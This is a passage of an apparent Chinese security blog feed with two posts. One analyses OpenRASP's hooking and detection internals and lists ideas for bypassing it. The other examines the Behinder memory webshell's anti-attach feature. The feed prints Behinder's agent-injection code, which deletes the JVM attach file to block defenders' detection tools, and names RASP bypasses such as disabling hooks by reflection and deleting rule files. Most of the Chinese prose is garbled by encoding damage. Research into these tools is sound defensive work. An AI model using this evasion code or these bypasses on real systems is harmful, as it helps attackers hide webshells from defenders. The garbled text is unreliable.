æŠ€æœ¯ï¼Œå®ç°å¯¹ç±»æ–¹æ³•çš„ä¿®æ”¹/æ’æ¡©ã€‚ä»¥CommonHttpClientHookä¸ºä¾‹ï¼Œæ•´ä¸ªè°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractClassHook#transformClass</span><br><span class="line">CommonHttpClientHook#hookMethod</span><br><span class="line">AbstractClassHook#insertAfter</span><br><span class="line">           javassist.CtBehavior#insertAfter</span><br></pre></td></tr></table></figure><p>å…·ä½“å…³é”®ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@HookAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonHttpClientHook</span> <span class="keyword">extends</span> <span class="title">AbstractSSRFHook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">        String src = getInvokeStaticSrc(CommonHttpClientHook.class, <span class="string">&quot;checkHttpConnection&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$0,$1&quot;</span>, Object.class, String.class);</span><br><span class="line">        insertAfter(ctClass, <span class="string">&quot;parseUriReference&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Z)V&quot;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>é€šè¿‡javassiståœ¨org.apache.commons.httpclient.URI#parseUriReferenceæ–¹æ³•ååŠ è½½äº†checkHttpConnectionè¿™ä¸ªæ–¹æ³•ä»£ç å—ã€‚<br>è¿™ä¸ªcheckHttpConnectionåŠŸèƒ½åˆ™ä¸ºæ”»å‡»æ£€æŸ¥åˆ†æé€»è¾‘ï¼Œåé¢è¯¦ç»†è®²ã€‚</p><h3 id="Hookäº†å“ªäº›ç±»æ–¹æ³•"><a href="#Hookäº†å“ªäº›ç±»æ–¹æ³•" class="headerlink" title="Hookäº†å“ªäº›ç±»æ–¹æ³•"></a>Hookäº†å“ªäº›ç±»æ–¹æ³•</h3><p>å®˜æ–¹æ–‡æ¡£ä¸­æœ‰åˆ—å‡ºè¯¦ç»†Hookäº†å“ªäº›å‡½æ•° <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook å‡½æ•°åˆ—è¡¨</a>ï¼Œå¦‚ä¸‹<br><img src="/images/pasted-148.png" alt="upload successful"></p><p>ç»§æ‰¿AbstractClassHookä¸”æœ‰HookAnnotationæ³¨è§£çš„ç±»ï¼Œä»–ä»¬çš„hooké€»è¾‘éƒ½ä¼šè¢«åŠ è½½ï¼Œå…·ä½“ç­›é€‰ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addAnnotationHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Set&lt;Class&gt; classesSet = AnnotationScanner.getClassWithAnnotation(SCAN_ANNOTATION_PACKAGE, HookAnnotation.class);</span><br><span class="line">    <span class="keyword">for</span> (Class clazz : classesSet) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = clazz.newInstance();</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> AbstractClassHook) &#123;</span><br><span class="line">                addHook((AbstractClassHook) object, clazz.getName());</span><br></pre></td></tr></table></figure><h2 id="OpenRaspçš„æ£€æµ‹é€»è¾‘"><a href="#OpenRaspçš„æ£€æµ‹é€»è¾‘" class="headerlink" title="OpenRaspçš„æ£€æµ‹é€»è¾‘"></a>OpenRaspçš„æ£€æµ‹é€»è¾‘</h2><p>åœ¨hookæ’å…¥çš„ä»£ç é€»è¾‘ï¼Œä¸€èˆ¬éƒ½æ˜¯é¢„å¤„ç†çš„é€»è¾‘ï¼ŒçœŸæ­£åˆ¤æ–­æ˜¯å¦æ˜¯æ¶æ„pocï¼Œæ˜¯åœ¨OpenRASPçš„checkeré€»è¾‘ä¸­ã€‚</p><h3 id="checker"><a href="#checker" class="headerlink" title="checker"></a>checker</h3><p>è¿˜æ˜¯ä»¥CommonHttpClientHook SSRFä¸ºä¾‹ï¼Œhookæ’å…¥äº†checkHttpConnectionå‡½æ•°ä»£ç å—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br><span class="line">        String port = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                host = Reflection.invokeStringMethod(object, <span class="string">&quot;getHost&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line">...</span><br><span class="line">            checkHttpUrl(url, host, port, <span class="string">&quot;commons_httpclient&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>checkHttpConnectionæœ€ç»ˆä¼šè°ƒç”¨Checkerï¼Œè¿›è¡Œè§„åˆ™åˆ¤æ–­ï¼Œè°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CommonHttpClientHook#checkHttpConnection</span><br><span class="line">AbstractSSRFHook#checkHttpUrl</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheck</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.plugin.checker.CheckerManager#check</span><br><span class="line">V8AttackChecker#check</span><br><span class="line">XssChecker#check</span><br><span class="line">SqlResultChecker#check</span><br><span class="line">MongoConnectionChecker#check</span><br><span class="line">SqlConnectionChecker#check</span><br><span class="line">...            </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-149.png" alt="upload successful"></p><p>Chekerç±»å‹å¯ä»¥å¤§è‡´åˆ†ä¸º3ç±»</p><ol><li>jsæ’ä»¶æ£€æµ‹ï¼Œå¦‚SQLã€å‘½ä»¤æ‰§è¡Œã€XXEã€SSRFä¹‹ç±»</li><li>javaæœ¬åœ°æ£€æŸ¥ï¼Œç›®å‰ä»…2ä¸ª</li><li>å®‰å…¨åŸºçº¿æ£€æµ‹ï¼Œä¸»è¦æ˜¯ç±»ä¼¼é…ç½®æ£€æŸ¥ï¼Œå¦‚å¼±å£ä»¤ä¹‹ç±»</li></ol><h3 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h3><p>ä»¥ä¸Šçš„Checkerä¸­ï¼Œä»¥V8AttackCheckeræœ€é‡è¦ã€‚è‡³äºä¸ºä½•è¦ç”¨JSæ£€æµ‹å¼•æ“ä½œä¸ºæ ¸å¿ƒï¼Œä¸ªäººè®¤ä¸ºä¸»è¦åŸå› åº”è¯¥æ˜¯æ”¯æŒè·¨è¯­è¨€ã€çƒ­éƒ¨ç½²ã€‚</p><h4 id="install-openrasp-v8-in-mac"><a href="#install-openrasp-v8-in-mac" class="headerlink" title="install openrasp-v8 in mac"></a>install openrasp-v8 in mac</h4><p>å®˜ç½‘çš„<a href="https://rasp.baidu.com/doc/hacking/compile/java.html#java-v8">å®‰è£…è„šæœ¬</a>æ˜¯linuxçš„ï¼Œè¿™é‡Œç»™ä¸‹maxä¸‹éœ€è¦å˜åŠ¨çš„å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ../java/src/main/resources/natives/osx_64 &amp;&amp; cp java/libopenrasp_v8_java.dylib <span class="variable">$_</span></span><br></pre></td></tr></table></figure><h4 id="JSå¼•æ“"><a href="#JSå¼•æ“" class="headerlink" title="JSå¼•æ“"></a>JSå¼•æ“</h4><p>å®˜æ–¹æ–‡æ¡£è¿˜æ˜¯Rhinoçš„æµç¨‹(è¿™é‡Œå’Œv8å¤§è‡´æ˜¯ä¸€æ ·çš„ï¼Œç»†èŠ‚ä¸åŒ)<br><img src="/images/pasted-150.png" alt="upload successful"></p><p>ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†</p><ol><li>openrasp-v8çš„jsåº“</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ console.jsconsole.logå®ç°</span><br><span class="line">â”œâ”€â”€ flex.jstokenizeåº“ï¼Œæœ‰sql_tokenize&amp;cmd_tokenize</span><br><span class="line">â””â”€â”€ rasp.jsRASPåŸºç¡€ç±»</span><br></pre></td></tr></table></figure><p>è¿™äº›åº“å¯ä»¥åœ¨jsæ’ä»¶ä¸­è¿›è¡Œè°ƒç”¨</p><ol start="2"><li>jsæ’ä»¶</li></ol><p>æ£€æµ‹é€»è¾‘éƒ½æ˜¯åœ¨jsæ’ä»¶å†…å®ç°ï¼Œåˆå§‹åŒ–æµç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#Initialize</span><br><span class="line">V8#Initialize</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#UpdatePlugin</span><br><span class="line">V8#CreateSnapshot</span><br><span class="line">V8#ExecuteScript</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#InitFileWatcher</span><br></pre></td></tr></table></figure><p>å…¶ä¸­V8.CreateSnapshot/ExecuteScriptéƒ½æ˜¯åœ¨openrasp-v8 jniå†…å®ç°çš„ï¼Œæœªæ·±å…¥è·Ÿè¸ªã€‚</p><p>å…¶ä¸­JS.UpdatePluginé»˜è®¤ä¼šåŠ è½½pluginsä¸‹é¢çš„jsã€‚è¿˜æœ‰InitFileWatcherå®æ—¶ç›‘æ§jsæ’ä»¶æ–‡ä»¶å˜åŠ¨ï¼Œè¿™ä¸ªå¸ˆå‚…ä»¬æœ‰è®²è¿™é‡Œä¹Ÿä¸è®²äº†ã€‚</p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><p>V8AttackCheckeråˆ°v8çš„æµç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V8AttackChecker#check</span><br><span class="line">JS#Check</span><br><span class="line">    V8#Check</span><br></pre></td></tr></table></figure><p>V8.Checkä¹Ÿæ˜¯jniå®ç°ï¼Œæš‚æ— åŠ›è·Ÿè¸ªï¼ŒçŒœæµ‹æ˜¯ä¼šæ ¹æ®typeï¼Œè°ƒç”¨å¯¹åº”çš„jsæ’ä»¶å†…çš„checkå‡½æ•°ï¼Œå¦‚type=ssrfï¼Œå°±ä¼šè°ƒç”¨official/plugins.jså†…çš„plugin.check_ssrfã€‚</p><h2 id="OpenRASPçš„ç»•è¿‡"><a href="#OpenRASPçš„ç»•è¿‡" class="headerlink" title="OpenRASPçš„ç»•è¿‡"></a>OpenRASPçš„ç»•è¿‡</h2><p>å‚è€ƒã€1ã€‘ä¸­æœ‰æåˆ°HookHandler.enableHookè¿™ä¸ªå±æ€§ï¼Œé€šè¿‡åå°„è®¾ç½®ä¸ºfalseå…³é—­HookåŠŸèƒ½ï¼Œè¾¾åˆ°OpenRASPçš„ç»•è¿‡ã€‚</p><p>ä»åŸç†ä¸Šå¤§è‡´è„‘çˆ†ä¸‹å¯èƒ½å­˜åœ¨çš„æ”»å‡»ç‚¹ï¼Œé™äºç²¾åŠ›ï¼ŒæœªåšéªŒè¯ã€‚</p><ul><li>å¯ä»¥æ ¹æ®OpenRASP Hook&amp;Checké€»è¾‘ä¸Šçš„ä¸€äº›æ§åˆ¶å˜é‡ï¼Œè¾¾åˆ°ç»•è¿‡æ•ˆæœï¼Œå¦‚ä¸Šé¢çš„enableHookã€‚</li><li>å¯ä»¥é€€å‡ºOpenRASPï¼Œå¦‚è°ƒç”¨EngineBoot#release</li><li>å¯ä»¥æçV8ï¼Œå¦‚V8.stackGetter</li><li>å¯ä»¥åˆ é™¤jsè§„åˆ™ï¼Œå¦‚plugins/xxx.js</li><li>é’ˆå¯¹æ€§ç»•è¿‡jsæ’ä»¶æ£€æµ‹é€»è¾‘</li></ul><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åœ¨é˜…è¯»å¸ˆå‚…ä»¬æ–‡ç« çš„åŸºç¡€ä¸Šï¼Œè®°å½•äº†è‡ªå·±åœ¨çº¯é™æ€è¯»OpenRASPæºç æ—¶æ„Ÿå…´è¶£çš„ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œå¤§è‡´å¯¹å…¶æ¶æ„åŸç†æœ‰äº†ä¸€å®šçš„äº†è§£ã€‚</p><p>ä¸ªäººè®¤ä¸ºæœ€ä¸»è¦çš„ç‚¹è¿˜æ˜¯åœ¨v8å¼•æ“ä»¥åŠæ’ä»¶çš„æ£€æµ‹é€»è¾‘ä¸Šï¼Œä½†æ˜¯æœ¬ç¯‡é‡ç‚¹æ²¡æœ‰åœ¨æ­¤ï¼Œåªæ˜¯ç®€è¦è¿‡äº†ä¸€éæ•´ä¸ªæ¶æ„åŠåŸç†ã€‚åç»­å¦‚æœæœ‰ç²¾åŠ›ï¼Œå¯èƒ½ä¼šåœ¨æ­¤åŸºç¡€ä¸Šå†ç ”ç©¶ä¸‹ç»•è¿‡çš„çŸ¥è¯†ã€‚</p><p>å‚è€ƒã€1ã€‘ä¸­æåˆ°openraspç±»ä¼˜å…ˆåŠ è½½å½±å“åº”ç”¨ç±»çš„é—®é¢˜ï¼Œå°è±¡ä¸­å•†ä¸šç‰ˆå¥½åƒæ˜¯åšäº†è§£å†³ï¼Œæ‰¾ä¸åˆ°ç¾¤èŠè®°å½•äº†ã€‚</p><p>æœ€åæœ‰è¶£çš„å…«å¦ä¸‹ï¼šopenraspä¸€å¼€å§‹ç”¨çš„æ˜¯v8+j2v8ï¼Œ0.20å› ä¸ºæ€§èƒ½åŸå› æ”¹æˆäº†Rhinoï¼Œ1.1åˆæ”¹å›äº†v8+è‡ªç ”çš„openrasp-v8ï¼Œæ„Ÿè§‰æ˜¯ä¸€æ®µç²¾ç›Šæ±‚ç²¾çš„å†å²ï¼Œå¾ˆæœ‰æ„æ€ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://threedr3am.github.io/2019/12/31/OpenRASP%E6%A0%B8%E5%BF%83%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">OpenRASPæ ¸å¿ƒæºç æµ…æ</a></li><li>[2] <a href="https://www.cnblogs.com/tr1ple/p/12918942.html">Java openraspå­¦ä¹ è®°å½•-2</a></li><li>[3] <a href="https://www.cnblogs.com/tr1ple/p/12709504.html#DAFPQtWG">Java openraspå­¦ä¹ è®°å½•-1</a></li><li>[4] <a href="https://paper.seebug.org/513/">Java RASPæµ…æâ€”â€”ä»¥ç™¾åº¦OpenRASPä¸ºä¾‹</a></li><li>[5] <a href="https://rasp.baidu.com/doc/hacking/architect/java.html">ç³»ç»Ÿæ¶æ„ - Java ç‰ˆæœ¬</a></li><li>[6] <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook å‡½æ•°åˆ—è¡¨</a></li><li>[7] <a href="https://github.com/baidu/openrasp">GitHub OpenRASP</a></li><li>[8] <a href="https://github.com/baidu-security/openrasp-v8">GitHub OpenRASP-v8</a></li><li>[9] <a href="https://paper.seebug.org/1041/#53">æµ…è°ˆ RASP</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;RASPï¼ˆRuntime Application self-protectionï¼‰æŠ€æœ¯è‡ªGartneråœ¨2014å¹´æå‡ºï¼Œå·²ç»æœ‰æŒºé•¿ä¸€æ®µæ—¶é—´äº†ã€‚å¤§å‚ä»¬ç°åœ¨åŸºæœ¬ä¹Ÿéƒ½æœ‰è‡ªç ”çš„RASPã€IASTäº§å“ã€‚åœ¨å¼€æºRASPä¸­ï¼Œåº”ä»¥OpenRASPèµ·æ­¥æœ€æ—©ï¼Œåº”ç”¨ä¹Ÿæœ€å¹¿ã€‚ä¸è¿‡å› ä¸ºæ€§èƒ½åŸå› ï¼Œåœ¨å®é™…æ”»é˜²ä¸­è¦†ç›–é¢è¿˜æ˜¯æœ‰é™ã€‚&lt;/p&gt;
&lt;p&gt;RASPç®—æ˜¯Javaå®‰å…¨ç»•ä¸å¼€çš„ä¸€ä¸ªæŠ€æœ¯ç‚¹ï¼Œæœ‰å…´è¶£å¯¹æ­¤å­¦ä¹ ç ”ç©¶ä¸€ç•ªã€‚å‚è€ƒæ–‡ç« ä¸­threedr3amã€tr1pleã€c0d3p1ut0så‡ ä¸ªå¸ˆå‚…ä»¬å¯¹äºOpenRASPçš„åŸç†ã€æŠ€æœ¯ç‚¹éƒ½æœ‰è·Ÿè¸ªå’Œè§£é‡Šï¼Œå› æ­¤æœ¬æ–‡ä¸å†å¤šåšç±»ä¼¼çš„é˜é‡Šï¼Œä¸»è¦é’ˆå¯¹è‡ªå·±çš„ä¸€äº›çŸ¥è¯†ç›²ç‚¹ã€å…´è¶£ç‚¹ï¼Œåšåšç ”ç©¶ä¸ç¬”è®°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;OpenRASPçš„Hook&quot;&gt;&lt;a href=&quot;#OpenRASPçš„Hook&quot; class=&quot;headerlink&quot; title=&quot;OpenRASPçš„Hook&quot;&gt;&lt;/a&gt;OpenRASPçš„Hook&lt;/h2&gt;&lt;p&gt;å…³æ³¨ä¸¤ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚ä½•Hookçš„&lt;/li&gt;
&lt;li&gt;Hookäº†å“ªäº›ç±»çš„å“ªäº›æ–¹æ³•&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;å¦‚ä½•Hook&quot;&gt;&lt;a href=&quot;#å¦‚ä½•Hook&quot; class=&quot;headerlink&quot; title=&quot;å¦‚ä½•Hook&quot;&gt;&lt;/a&gt;å¦‚ä½•Hook&lt;/h3&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OpenRASP" scheme="http://m0d9.me/tags/OpenRASP/"/>
    
    <category term="RASP" scheme="http://m0d9.me/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>ä»å†°èantiAgentçœ‹Java Attachæœºåˆ¶</title>
    <link href="http://m0d9.me/2021/06/21/JVM-Attach/"/>
    <id>http://m0d9.me/2021/06/21/JVM-Attach/</id>
    <published>2021-06-21T09:24:00.000Z</published>
    <updated>2021-06-24T07:15:51.920Z</updated>
    
    <content type="html"><![CDATA[<p>webshellçš„éšè—ä¸æ£€å‡ºä¸€ç›´ä»¥æ¥éƒ½æ˜¯æ”»é˜²çš„ç„¦ç‚¹ï¼Œéšç€å†…å­˜é©¬çš„ç ”ç©¶ä¸å·¥å…·çš„å…¬å¼€ï¼Œå†…å­˜shellå·²ç„¶æˆä¸ºäº†webshellä¸»æµã€‚</p><p>å¼•ç”¨ã€9ã€‘ä¸­å…³äºæ”»å‡»çš„æ€è·¯</p><blockquote><ol><li>åŸºäºServletè§„èŒƒçš„åˆ©ç”¨ï¼ŒåŠ¨æ€æ³¨å†ŒServletè§„èŒƒä¸­çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬Servletï¼ŒFilterï¼ŒListenerï¼Œè¿™éƒ¨åˆ†çš„å…¬å¼€æ–‡ç« æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚ï¼šåŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ï¼ˆ<a href="https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82">https://xz.aliyun.com/t/7388ï¼‰ã€‚</a></li><li>åŸºäºç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨ï¼Œæ¡†æ¶ä¸€èˆ¬å¯¹äºServletåˆè¿›è¡Œäº†ä¸€å±‚å°è£…ï¼ŒåŠ¨æ€æ³¨å†Œæ¡†æ¶çš„è·¯ç”±ï¼Œæ–‡ç« ï¼šåŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ï¼ˆ<a href="https://www.anquanke.com/post/id/198886%EF%BC%89">https://www.anquanke.com/post/id/198886ï¼‰</a></li><li>åŸºäºjavaagentä¿®æ”¹Servletå¤„ç†æµç¨‹ä¸­çš„å­—èŠ‚ç ï¼Œå·¥å…·ï¼šmemShellï¼ˆ<a href="https://github.com/rebeyond/memShell%EF%BC%89">https://github.com/rebeyond/memShellï¼‰</a></li></ol></blockquote><p>å¼•ç”¨ã€8ã€‘ä¸­å…³äºæ£€æµ‹çš„æ€è·¯</p><blockquote><p>æ— è®ºæ˜¯ä»¥ä¸Šå“ªç§æ”»å‡»æ–¹å¼ï¼Œä»é˜²å®ˆæ–¹çš„è§’åº¦æ¥è¯´ï¼Œæ£€æµ‹çš„æ–¹å¼éƒ½æ˜¯é€šè¿‡java instrumentationæœºåˆ¶ï¼Œå°†æ£€æµ‹jaråŒ…attachåˆ°tomcat jvmï¼Œæ£€æŸ¥åŠ è½½åˆ°jvmä¸­çš„ç±»æ˜¯å¦å¼‚å¸¸ã€‚æ•´ä½“æ£€æµ‹æ€è·¯ä¸ºï¼š</p><ol><li>è·å–tomcat jvmä¸­æ‰€æœ‰åŠ è½½çš„ç±»</li><li>éå†æ¯ä¸ªç±»ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºé£é™©ç±»ã€‚æˆ‘ä»¬æŠŠå¯èƒ½è¢«æ”»å‡»æ–¹æ–°å¢/ä¿®æ”¹å†…å­˜ä¸­çš„ç±»ï¼Œæ ‡è®°ä¸ºé£é™©ç±»ï¼ˆæ¯”å¦‚å®ç°äº†filter/servletçš„ç±»ï¼‰</li><li>éå†é£é™©ç±»ï¼Œæ£€æŸ¥æ˜¯å¦ä¸ºwebshellï¼š</li><li>æ£€æŸ¥é«˜é£é™©ç±»çš„classæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›</li><li>åç¼–è¯‘é£é™©ç±»å­—èŠ‚ç ï¼Œæ£€æŸ¥javaæ–‡ä»¶ä¸­åŒ…å«æ¶æ„ä»£ç </li></ol></blockquote><p>æœ‰æ”»æœ‰é˜²ï¼Œè€Œé˜²å¾¡åˆå¼•å‘æ”»å‡»çš„å‡çº§ï¼Œå†°èæœ€æ–°ç‰ˆå·²ç»åŠ å…¥äº†åVirtualMachine.AttachåŠŸèƒ½ã€‚</p><a id="more"></a><h2 id="å†°èAntiAgent"><a href="#å†°èAntiAgent" class="headerlink" title="å†°èAntiAgent"></a>å†°èAntiAgent</h2><h3 id="AntiAgentçš„å®ç°"><a href="#AntiAgentçš„å®ç°" class="headerlink" title="AntiAgentçš„å®ç°"></a>AntiAgentçš„å®ç°</h3><p>å…ˆçœ‹çœ‹å†°èçš„å®ç°ï¼Œå…·ä½“åœ¨MemShell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAgentShell</span><span class="params">(<span class="keyword">boolean</span> antiAgent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">      Method attachMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, String.class);</span><br><span class="line">      Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, String.class, String.class);</span><br><span class="line">      Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());</span><br><span class="line">      loadAgentMethod.invoke(obj, libPath, base64encode(path) + <span class="string">&quot;|&quot;</span> + base64encode(password));</span><br><span class="line">      String osInfo = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">      <span class="keyword">if</span> (osInfo.indexOf(<span class="string">&quot;windows&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;winnt&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;linux&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; antiAgent) &#123;</span><br><span class="line">         String fileName = <span class="string">&quot;/tmp/.java_pid&quot;</span> + getCurrentPID();</span><br><span class="line">         (<span class="keyword">new</span> File(fileName)).delete();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">      var12.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Error var13) &#123;</span><br><span class="line">      var13.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      (<span class="keyword">new</span> File(libPath)).delete();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•AntiAgent"><a href="#æµ‹è¯•AntiAgent" class="headerlink" title="æµ‹è¯•AntiAgent"></a>æµ‹è¯•AntiAgent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testAttach</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String pid = <span class="string">&quot;2715&quot;</span>;</span><br><span class="line">            System.out.println(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>));</span><br><span class="line">            String password = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            String currentPath = <span class="string">&quot;/Users/mody/study/java/MemShell/memShell/target/&quot;</span>;</span><br><span class="line">            String agentFile = currentPath + <span class="string">&quot;agent.jar&quot;</span>;</span><br><span class="line">            agentFile = <span class="keyword">new</span> File(agentFile).getCanonicalPath();</span><br><span class="line">            String agentArgs = currentPath;</span><br><span class="line">            <span class="keyword">if</span> (!password.equals(<span class="string">&quot;&quot;</span>) || password != <span class="keyword">null</span>) &#123;</span><br><span class="line">                agentArgs = agentArgs + <span class="string">&quot;^&quot;</span> + password;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    